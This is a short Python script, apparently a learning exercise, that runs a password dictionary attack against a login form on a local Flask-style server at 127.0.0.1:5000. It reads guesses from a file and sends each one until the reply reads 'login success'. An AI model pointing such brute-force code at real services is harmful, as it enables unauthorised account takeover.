import urllib
import urllib.request
f = open("pass.txt")
user = input("input username:")
while 1:
    pwd = f.readline().strip()  # 讀檔
    if not pwd:
        print('no match password')
        break
    data = {}
    data['username'] = user
    data['password'] = pwd
    # string username=user&password=pwd
    url_parame = urllib.parse.urlencode(data)

    url = "http://127.0.0.1:5000/user/login?"

    all_url = url + url_parame

    response = urllib.request.urlopen(all_url).read()  # 取得回應
    record = response.decode('UTF-8')  # 對訊息進行解碼
    if record == 'login success':
        print(data['username'], 'password:', pwd)
        break
    else:
        print("Password", pwd, 'is error')
input("Press enter continue")
